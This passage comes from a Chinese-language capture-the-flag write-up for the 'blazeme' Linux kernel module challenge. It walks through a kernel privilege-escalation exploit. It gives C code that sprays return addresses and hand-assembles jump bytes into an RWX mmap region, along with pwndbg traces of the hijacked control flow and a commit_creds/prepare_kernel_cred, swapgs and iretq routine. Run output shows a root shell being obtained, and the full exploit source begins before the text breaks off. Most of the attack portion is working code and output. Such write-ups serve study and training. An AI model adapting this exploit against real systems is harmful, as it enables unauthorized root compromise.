<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span>i<span class="op">=</span><span class="dv">0</span><span class="op">;</span>i<span class="op">&lt;</span><span class="dv">8</span><span class="op">;</span>i<span class="op">++)</span></span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">{</span></span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>        msg2<span class="op">[</span>i<span class="op">]</span> <span class="op">=</span> spray_ret_addr<span class="op">;</span></span>
<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>    memcpy<span class="op">(</span>in_buf<span class="op">,</span><span class="st">&quot;AA&quot;</span><span class="op">,</span><span class="dv">2</span><span class="op">);</span></span>
<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>    memcpy<span class="op">(&amp;</span>in_buf<span class="op">[</span><span class="dv">2</span><span class="op">],</span>msg2<span class="op">,</span><span class="kw">sizeof</span><span class="op">(</span>in_buf<span class="op">)-</span><span class="dv">2</span><span class="op">);</span></span></code></pre></div>
<p>如何让代码执行从mmap的内存区域跳转到用户态代码空间呢？</p>
<p>做法是将需要执行的用户态代码地址写如rsp指向的栈内存中，然后执行ret操作。</p>
<div class="sourceCode" id="cb17"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>ash@ash<span class="op">-</span>VirtualBox<span class="op">:~</span>$ rasm2 <span class="op">-</span>a  x86 <span class="op">-</span>b <span class="dv">64</span> <span class="st">&quot;mov [rsp],0&quot;</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="dv">48</span><span class="er">c7042400000000</span> </span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>ash@ash<span class="op">-</span>VirtualBox<span class="op">:~</span>$ rasm2 <span class="op">-</span>a  x86 <span class="op">-</span>b <span class="dv">64</span> <span class="st">&quot;mov [rsp+4],0&quot;</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="dv">48</span><span class="er">c744240400000000</span></span></code></pre></div>
<p>因此，我们只需要在mmap的内存去域执行如下的代码接口：</p>
<div class="sourceCode" id="cb18"><pre
class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a><span class="kw">mov</span> <span class="op">[</span><span class="kw">rsp</span><span class="op">],</span>low_target_addr</span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="kw">mov</span> <span class="op">[</span><span class="kw">rsp</span><span class="op">+</span><span class="dv">4</span><span class="op">],</span>high_target_addr</span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="cf">ret</span></span></code></pre></div>
<p>mmap区域的代码初始化逻辑如下：</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> mmaping_shellcode_area<span class="op">()</span></span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">void</span> <span class="op">*</span> p <span class="op">=</span> mmap<span class="op">(</span>start_addr<span class="op">,</span><span class="dv">4096</span><span class="op">,</span>PROT_READ <span class="op">|</span> PROT_WRITE <span class="op">|</span> PROT_EXEC<span class="op">,</span>MAP_ANONYMOUS <span class="op">|</span> MAP_PRIVATE<span class="op">,</span><span class="dv">0</span><span class="op">,</span><span class="dv">0</span><span class="op">);</span></span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;get mmap point:%p</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span>p<span class="op">);</span></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>    memset<span class="op">(</span>p<span class="op">,</span><span class="bn">0x90</span><span class="op">,</span><span class="bn">0x1000</span><span class="op">);</span></span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> <span class="op">*</span>code <span class="op">=</span> <span class="op">(</span><span class="dt">char</span><span class="op">*)</span>start_addr<span class="op">;</span></span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">//char *get_root_code = (char*)&amp;get_root+4;</span></span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>    <span class="co">//memcpy(code,get_root_code,49);</span></span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> low <span class="op">=</span> <span class="op">(</span><span class="dt">unsigned</span> <span class="dt">long</span><span class="op">)&amp;</span>get_root <span class="op">&amp;</span> <span class="bn">0xffffffff</span><span class="op">;</span></span>
<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a>    <span class="dt">unsigned</span> <span class="dt">long</span> high <span class="op">=</span> <span class="op">((</span><span class="dt">unsigned</span> <span class="dt">long</span><span class="op">)&amp;</span>get_root <span class="op">&gt;&gt;</span> <span class="dv">32</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xffffffff</span><span class="op">;</span></span>
<span id="cb19-13"><a href="#cb19-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-14"><a href="#cb19-14" aria-hidden="true" tabindex="-1"></a>    <span class="co">/*</span></span>
<span id="cb19-15"><a href="#cb19-15" aria-hidden="true" tabindex="-1"></a><span class="co">     *  orignal:</span></span>
<span id="cb19-16"><a href="#cb19-16" aria-hidden="true" tabindex="-1"></a><span class="co">     *  0x5dffc515    mov    dword ptr [rsp], 0x401ea6</span></span>
<span id="cb19-17"><a href="#cb19-17" aria-hidden="true" tabindex="-1"></a><span class="co">     *  0x5dffc51c    mov    dword ptr [rsp + 4], 0</span></span>
<span id="cb19-18"><a href="#cb19-18" aria-hidden="true" tabindex="-1"></a><span class="co">     *  0x5dffc524    ret  </span></span>
<span id="cb19-19"><a href="#cb19-19" aria-hidden="true" tabindex="-1"></a><span class="co">     */</span></span>
<span id="cb19-20"><a href="#cb19-20" aria-hidden="true" tabindex="-1"></a>    <span class="co">/*</span></span>
<span id="cb19-21"><a href="#cb19-21" aria-hidden="true" tabindex="-1"></a><span class="co">    ash@ash-VirtualBox:~$ rasm2 -a  x86 -b 64 &quot;mov [rsp+4],0&quot;</span></span>
<span id="cb19-22"><a href="#cb19-22" aria-hidden="true" tabindex="-1"></a><span class="co">    48c744240400000000</span></span>
<span id="cb19-23"><a href="#cb19-23" aria-hidden="true" tabindex="-1"></a><span class="co">    ash@ash-VirtualBox:~$ rasm2 -a  x86 -b 64 &quot;mov [rsp],0&quot;</span></span>
<span id="cb19-24"><a href="#cb19-24" aria-hidden="true" tabindex="-1"></a><span class="co">    48c7042400000000</span></span>
<span id="cb19-25"><a href="#cb19-25" aria-hidden="true" tabindex="-1"></a><span class="co">    */</span></span>
<span id="cb19-26"><a href="#cb19-26" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> i<span class="op">=</span><span class="dv">0</span><span class="op">;</span></span>
<span id="cb19-27"><a href="#cb19-27" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x48</span><span class="op">;</span></span>
<span id="cb19-28"><a href="#cb19-28" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-29"><a href="#cb19-29" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0xc7</span><span class="op">;</span></span>
<span id="cb19-30"><a href="#cb19-30" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x04</span><span class="op">;</span></span>
<span id="cb19-31"><a href="#cb19-31" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x24</span><span class="op">;</span></span>
<span id="cb19-32"><a href="#cb19-32" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-33"><a href="#cb19-33" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>low<span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb19-34"><a href="#cb19-34" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>low <span class="op">&gt;&gt;</span> <span class="dv">8</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb19-35"><a href="#cb19-35" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>low <span class="op">&gt;&gt;</span> <span class="dv">16</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb19-36"><a href="#cb19-36" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>low <span class="op">&gt;&gt;</span> <span class="dv">24</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb19-37"><a href="#cb19-37" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-38"><a href="#cb19-38" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-39"><a href="#cb19-39" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x48</span><span class="op">;</span></span>
<span id="cb19-40"><a href="#cb19-40" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0xc7</span><span class="op">;</span></span>
<span id="cb19-41"><a href="#cb19-41" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x44</span><span class="op">;</span></span>
<span id="cb19-42"><a href="#cb19-42" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x24</span><span class="op">;</span></span>
<span id="cb19-43"><a href="#cb19-43" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0x04</span><span class="op">;</span></span>
<span id="cb19-44"><a href="#cb19-44" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-45"><a href="#cb19-45" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>high<span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb19-46"><a href="#cb19-46" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>high <span class="op">&gt;&gt;</span> <span class="dv">8</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb19-47"><a href="#cb19-47" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>high <span class="op">&gt;&gt;</span> <span class="dv">16</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb19-48"><a href="#cb19-48" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="op">(</span>high <span class="op">&gt;&gt;</span> <span class="dv">24</span><span class="op">)</span> <span class="op">&amp;</span> <span class="bn">0xff</span><span class="op">;</span></span>
<span id="cb19-49"><a href="#cb19-49" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-50"><a href="#cb19-50" aria-hidden="true" tabindex="-1"></a>    code<span class="op">[</span>i<span class="op">++]</span> <span class="op">=</span> <span class="bn">0xc3</span><span class="op">;</span></span>
<span id="cb19-51"><a href="#cb19-51" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>思路总结：</p>
<figure>
<img src="./imgs/blazeme-1.png" alt="blazeme-1.png" />
<figcaption aria-hidden="true">blazeme-1.png</figcaption>
</figure>
<h2 id="debugrun-and-exp">5.debug,run and exp</h2>
<p>启动gdb，在地址0xffffffff814b4524和0x5dffc515处下断点。</p>
<p>启动虚拟机，并执行gdb执行target remote:1234</p>
<p>第一步获得断点停留，表明我们已成功劫持了返回值：</p>
<div class="sourceCode" id="cb20"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">pwndbg</span><span class="op">&gt;</span> c</span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Continuing.</span></span>
<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Breakpoint</span> 1, 0xffffffff814b4524 in <span class="pp">??</span> <span class="er">(</span><span class="kw">)</span></span>
<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="ex">LEGEND:</span> STACK <span class="kw">|</span> <span class="ex">HEAP</span> <span class="kw">|</span> <span class="ex">CODE</span> <span class="kw">|</span> <span class="ex">DATA</span> <span class="kw">|</span> <span class="ex">RWX</span> <span class="kw">|</span> <span class="ex">RODATA</span></span>
<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="ex">───────────────────────────────────────────────────────────────────────────────────────[</span> REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────</span>
<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="ex">*RAX</span>  0x40</span>
<span id="cb20-8"><a href="#cb20-8" aria-hidden="true" tabindex="-1"></a><span class="ex">*RBX</span>  0x4141ffff814b4524</span>
<span id="cb20-9"><a href="#cb20-9" aria-hidden="true" tabindex="-1"></a> <span class="ex">RCX</span>  0x0</span>
<span id="cb20-10"><a href="#cb20-10" aria-hidden="true" tabindex="-1"></a><span class="ex">*RDX</span>  0xffff880003c1ac68 —▸ 0xffff880003c15458 ◂— 0</span>
<span id="cb20-11"><a href="#cb20-11" aria-hidden="true" tabindex="-1"></a><span class="ex">*RDI</span>  0xffff880003c15458 ◂— 0</span>
<span id="cb20-12"><a href="#cb20-12" aria-hidden="true" tabindex="-1"></a><span class="ex">*RSI</span>  0xffff880003c15458 ◂— 0</span>
<span id="cb20-13"><a href="#cb20-13" aria-hidden="true" tabindex="-1"></a><span class="ex">*R8</span>   0x0</span>
<span id="cb20-14"><a href="#cb20-14" aria-hidden="true" tabindex="-1"></a><span class="ex">*R9</span>   0x518</span>
<span id="cb20-15"><a href="#cb20-15" aria-hidden="true" tabindex="-1"></a><span class="ex">*R10</span>  0xffff814b4524ffff</span>
<span id="cb20-16"><a href="#cb20-16" aria-hidden="true" tabindex="-1"></a><span class="ex">*R11</span>  0x1</span>
<span id="cb20-17"><a href="#cb20-17" aria-hidden="true" tabindex="-1"></a><span class="ex">*R12</span>  0xffffffff814b4524 ◂— push   0x5dffc515</span>
<span id="cb20-18"><a href="#cb20-18" aria-hidden="true" tabindex="-1"></a><span class="ex">*R13</span>  0x7ffddf97fff0 ◂— and    al, 0x45 /<span class="pp">*</span> 0xffff814b45244141 <span class="pp">*</span>/</span>
<span id="cb20-19"><a href="#cb20-19" aria-hidden="true" tabindex="-1"></a><span class="ex">*R14</span>  0x0</span>
<span id="cb20-20"><a href="#cb20-20" aria-hidden="true" tabindex="-1"></a><span class="ex">*R15</span>  0xffffc90000157f20 ◂— 0</span>
<span id="cb20-21"><a href="#cb20-21" aria-hidden="true" tabindex="-1"></a><span class="ex">*RBP</span>  0xffffffff814b4524 ◂— push   0x5dffc515</span>
<span id="cb20-22"><a href="#cb20-22" aria-hidden="true" tabindex="-1"></a><span class="ex">*RSP</span>  0xffffc90000157e60 —▸ 0xffffffff814b4524 ◂— push   0x5dffc515</span>
<span id="cb20-23"><a href="#cb20-23" aria-hidden="true" tabindex="-1"></a><span class="ex">*RIP</span>  0xffffffff814b4524 ◂— push   0x5dffc515</span>
<span id="cb20-24"><a href="#cb20-24" aria-hidden="true" tabindex="-1"></a><span class="ex">────────────────────────────────────────────────────────────────────────────────────────[</span> DISASM ]─────────────────────────────────────────────────────────────────────────────────────────</span>
<span id="cb20-25"><a href="#cb20-25" aria-hidden="true" tabindex="-1"></a> <span class="ex">►</span> 0xffffffff814b4524    push   0x5dffc515</span>
<span id="cb20-26"><a href="#cb20-26" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0xffffffff814b4529</span>    ret    </span>
<span id="cb20-27"><a href="#cb20-27" aria-hidden="true" tabindex="-1"></a>    <span class="ex">↓</span></span>
<span id="cb20-28"><a href="#cb20-28" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x5dffc515</span>            mov    qword ptr [rsp], 0x401ea6</span>
<span id="cb20-29"><a href="#cb20-29" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x5dffc51d</span>            mov    qword ptr [rsp + 4], 0</span>
<span id="cb20-30"><a href="#cb20-30" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x5dffc526</span>            ret    </span>
<span id="cb20-31"><a href="#cb20-31" aria-hidden="true" tabindex="-1"></a>    <span class="ex">↓</span></span>
<span id="cb20-32"><a href="#cb20-32" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x401ea6</span>              endbr64 </span>
<span id="cb20-33"><a href="#cb20-33" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x401eaa</span>              push   rbp</span>
<span id="cb20-34"><a href="#cb20-34" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x401eab</span>              mov    rbp, rsp</span>
<span id="cb20-35"><a href="#cb20-35" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x401eae</span>              push   rbx</span>
<span id="cb20-36"><a href="#cb20-36" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x401eaf</span>              sub    rsp, 8</span>
<span id="cb20-37"><a href="#cb20-37" aria-hidden="true" tabindex="-1"></a>   <span class="ex">0x401eb3</span>              mov    rbx, qword ptr [rip + 0xc0246]</span></code></pre></div>
<p>第二步，查看程序已经进入mmap的内存空间，执行代码：</p>
<div class="sourceCode" id="cb21"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> c</span>
<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a>Continuing<span class="op">.</span></span>
<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a>Breakpoint <span class="dv">2</span><span class="op">,</span> <span class="bn">0x000000005dffc515</span> in <span class="op">??</span> <span class="op">()</span></span>
<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a>LEGEND<span class="op">:</span> STACK <span class="op">|</span> HEAP <span class="op">|</span> CODE <span class="op">|</span> DATA <span class="op">|</span> RWX <span class="op">|</span> RODATA</span>
<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a>───────────────────────────────────────────────────────────────────────────────────────<span class="op">[</span> REGISTERS <span class="op">]</span>───────────────────────────────────────────────────────────────────────────────────────</span>
<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a> RAX  <span class="bn">0x40</span></span>
<span id="cb21-8"><a href="#cb21-8" aria-hidden="true" tabindex="-1"></a> RBX  <span class="bn">0x4141ffff814b4524</span></span>
<span id="cb21-9"><a href="#cb21-9" aria-hidden="true" tabindex="-1"></a> RCX  <span class="bn">0x0</span></span>
<span id="cb21-10"><a href="#cb21-10" aria-hidden="true" tabindex="-1"></a> RDX  <span class="bn">0xffff880003c1ac68</span> —▸ <span class="bn">0xffff880003c15458</span> ◂— <span class="dv">0</span></span>
<span id="cb21-11"><a href="#cb21-11" aria-hidden="true" tabindex="-1"></a> RDI  <span class="bn">0xffff880003c15458</span> ◂— <span class="dv">0</span></span>
<span id="cb21-12"><a href="#cb21-12" aria-hidden="true" tabindex="-1"></a> RSI  <span class="bn">0xffff880003c15458</span> ◂— <span class="dv">0</span></span>
<span id="cb21-13"><a href="#cb21-13" aria-hidden="true" tabindex="-1"></a> R8   <span class="bn">0x0</span></span>
<span id="cb21-14"><a href="#cb21-14" aria-hidden="true" tabindex="-1"></a> R9   <span class="bn">0x518</span></span>
<span id="cb21-15"><a href="#cb21-15" aria-hidden="true" tabindex="-1"></a> R10  <span class="bn">0xffff814b4524ffff</span></span>
<span id="cb21-16"><a href="#cb21-16" aria-hidden="true" tabindex="-1"></a> R11  <span class="bn">0x1</span></span>
<span id="cb21-17"><a href="#cb21-17" aria-hidden="true" tabindex="-1"></a> R12  <span class="bn">0xffffffff814b4524</span> ◂— push   <span class="bn">0x5dffc515</span></span>
<span id="cb21-18"><a href="#cb21-18" aria-hidden="true" tabindex="-1"></a> R13  <span class="bn">0x7ffddf97fff0</span> ◂— and    al<span class="op">,</span> <span class="bn">0x45</span> <span class="co">/* 0xffff814b45244141 */</span></span>
<span id="cb21-19"><a href="#cb21-19" aria-hidden="true" tabindex="-1"></a> R14  <span class="bn">0x0</span></span>
<span id="cb21-20"><a href="#cb21-20" aria-hidden="true" tabindex="-1"></a> R15  <span class="bn">0xffffc90000157f20</span> ◂— <span class="dv">0</span></span>
<span id="cb21-21"><a href="#cb21-21" aria-hidden="true" tabindex="-1"></a> RBP  <span class="bn">0xffffffff814b4524</span> ◂— push   <span class="bn">0x5dffc515</span></span>
<span id="cb21-22"><a href="#cb21-22" aria-hidden="true" tabindex="-1"></a> RSP  <span class="bn">0xffffc90000157e60</span> —▸ <span class="bn">0xffffffff814b4524</span> ◂— push   <span class="bn">0x5dffc515</span></span>
<span id="cb21-23"><a href="#cb21-23" aria-hidden="true" tabindex="-1"></a><span class="op">*</span>RIP  <span class="bn">0x5dffc515</span> ◂— mov    qword ptr <span class="op">[</span>rsp<span class="op">],</span> <span class="bn">0x401ea6</span> <span class="co">/* 0x401ea62404c748 */</span></span>
<span id="cb21-24"><a href="#cb21-24" aria-hidden="true" tabindex="-1"></a>────────────────────────────────────────────────────────────────────────────────────────<span class="op">[</span> DISASM <span class="op">]</span>─────────────────────────────────────────────────────────────────────────────────────────</span>
<span id="cb21-25"><a href="#cb21-25" aria-hidden="true" tabindex="-1"></a> ► <span class="bn">0x5dffc515</span>    mov    qword ptr <span class="op">[</span>rsp<span class="op">],</span> <span class="bn">0x401ea6</span></span>
<span id="cb21-26"><a href="#cb21-26" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x5dffc51d</span>    mov    qword ptr <span class="op">[</span>rsp <span class="op">+</span> <span class="dv">4</span><span class="op">],</span> <span class="dv">0</span></span>
<span id="cb21-27"><a href="#cb21-27" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x5dffc526</span>    ret    </span>
<span id="cb21-28"><a href="#cb21-28" aria-hidden="true" tabindex="-1"></a>    ↓</span>
<span id="cb21-29"><a href="#cb21-29" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x401ea6</span>      endbr64 </span>
<span id="cb21-30"><a href="#cb21-30" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x401eaa</span>      push   rbp</span>
<span id="cb21-31"><a href="#cb21-31" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x401eab</span>      mov    rbp<span class="op">,</span> rsp</span>
<span id="cb21-32"><a href="#cb21-32" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x401eae</span>      push   rbx</span>
<span id="cb21-33"><a href="#cb21-33" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x401eaf</span>      sub    rsp<span class="op">,</span> <span class="dv">8</span></span>
<span id="cb21-34"><a href="#cb21-34" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x401eb3</span>      mov    rbx<span class="op">,</span> qword ptr <span class="op">[</span>rip <span class="op">+</span> <span class="bn">0xc0246</span><span class="op">]</span></span>
<span id="cb21-35"><a href="#cb21-35" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x401eba</span>      mov    rax<span class="op">,</span> qword ptr <span class="op">[</span>rip <span class="op">+</span> <span class="bn">0xc0237</span><span class="op">]</span></span>
<span id="cb21-36"><a href="#cb21-36" aria-hidden="true" tabindex="-1"></a>   <span class="bn">0x401ec1</span>      mov    edi<span class="op">,</span> <span class="dv">0</span></span></code></pre></div>
<p>查看即将要执行提权和swapgs和iretq的代码：</p>
<pre class="textile"><code>pwndbg&gt; x/30wi 0x401ea6
   0x401ea6:    endbr64 
   0x401eaa:    push   rbp
   0x401eab:    mov    rbp,rsp
   0x401eae:    push   rbx
   0x401eaf:    sub    rsp,0x8
   0x401eb3:    mov    rbx,QWORD PTR [rip+0xc0246]        # 0x4c2100
   0x401eba:    mov    rax,QWORD PTR [rip+0xc0237]        # 0x4c20f8
   0x401ec1:    mov    edi,0x0
   0x401ec6:    call   rax
   0x401ec8:    mov    rdi,rax
   0x401ecb:    call   rbx
   0x401ecd:    swapgs 
   0x401ed0:    mov    rsp,0x4c5480
   0x401ed7:    iretq  
   0x401ed9:    nop
   0x401eda:    add    rsp,0x8
   0x401ede:    pop    rbx
   0x401edf:    pop    rbp
   0x401ee0:    ret    
</code></pre>
<p>执行结果：</p>
<pre class="textile"><code>try to write..........
-------------------997-----------------------
try to write..........
-------------------998-----------------------
try to write..........
-------------------999-----------------------
try to write..........
$ ./root/exp 40
arg:40
get mmap point:0x5dffc000
-------------------0-----------------------
try to write..........
-------------------1-----------------------
try to write..........
-------------------2-----------------------
try to write..........
-------------------3-----------------------
try to write..........
-------------------4-----------------------
try to write..........
-------------------5-----------------------
try to write..........
-------------------6-----------------------
try to write..........
-------------------7-----------------------
try to write..........
-------------------8-----------------------
try to write..........
$ id
uid=0(root) gid=0(root)
$ exit
Segmentation fault
$ id
uid=1000(blazeme) gid=1000(blazeme) groups=1000(blazeme)
$ 
</code></pre>
<h2 id="whole-piece-of-exp-code">6. whole piece of exp code</h2>
<div class="sourceCode" id="cb24"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></span>
<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdlib.h&gt;</span></span>
<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></span>
<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;string.h&gt;</span></span>
<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></span>
<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;stdint.h&gt;</span></span>
<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#include</span><span class="im">&lt;sys/mman.h&gt;</span></span>
<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> fd <span class="op">=</span> <span class="op">-</span><span class="dv">1</span><span class="op">;</span></span>
<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> <span class="op">*(*</span>prepare_kernel_cred<span class="op">)(</span><span class="dt">void</span> <span class="op">*)</span> <span class="op">=</span> <span class="bn">0xffffffff81063b50</span><span class="op">;</span><span class="co">//T prepare_kernel_cred</span></span>
<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> <span class="op">*(*</span>commit_creds<span class="op">)(</span><span class="dt">void</span><span class="op">*)=</span><span class="bn">0xffffffff81063960</span><span class="op">;</span><span class="co">// T commit_creds</span></span>
<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> blazeme_read<span class="op">(</span><span class="dt">int</span> fd<span class="op">,</span><span class="dt">char</span> <span class="op">*</span>buf<span class="op">,</span><span class="dt">size_t</span> sz<span class="op">)</span></span>
<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
